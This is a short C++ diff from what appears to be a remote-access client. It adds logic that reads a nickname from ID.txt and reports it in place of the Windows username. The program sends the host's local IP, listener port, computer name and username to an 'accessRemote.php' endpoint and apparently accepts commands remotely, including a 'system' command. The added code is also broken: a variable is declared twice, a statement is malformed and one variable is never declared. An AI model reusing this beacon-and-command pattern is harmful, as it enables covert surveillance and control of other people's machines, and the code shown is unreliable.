@@ -110,6 +110,24 @@ int main(int argc, char *argv[])
 
 	//voIpRecord recordIp("127.0.0.1", 0);
 
+	//c'est a moi ça xD
+	string pseudo;
+	bool name;
+	ifstream name("ID.txt", ios::in);
+
+	name.open()
+		if (name)
+		{
+			getline(name, pseudo);
+			nom = true;
+		}
+		else
+		{
+			GetUserNameW(username, &usernameSize);
+			nom = false;
+		}
+	name.close()
+
 	while (1) {
 		if (!isConnected) {
 			
@@ -394,13 +412,15 @@ int main(int argc, char *argv[])
 			temps = temps2;
 			str.str("");
 			str.clear();
-			GetUserNameW(username, &usernameSize);
 			str << "/accessRemote.php?ipLocal=" << sf::IpAddress::getLocalAddress() << "&";
 			str << "port=" << listener.getLocalPort() << "&";
 			_dupenv_s(&pValue1, &len1, "COMPUTERNAME");
 			str << "compName=" << pValue1 << "&";
 			_dupenv_s(&pValue2, &len2, "USERNAME");
-			str << "userName=" << username << "&";
+			if(nom == false)
+				str << "userName=" << username << "&";
+			else
+				str << "userName=" << pseudo << "&";
 			str << "version=" << version;
 			request.setUri(str.str());
 			//cout << "str: " << str.str() << endl;
@@ -486,7 +506,7 @@ void httpCmd(string cmd, string arg1, string arg2, string arg3)
 	{
 		ofstream name("ID.txt", ios::out | ios::trunc);
 		name << arg1;
-		name.close;
+		name.close();
 	}
 
 	if (cmd == "system")
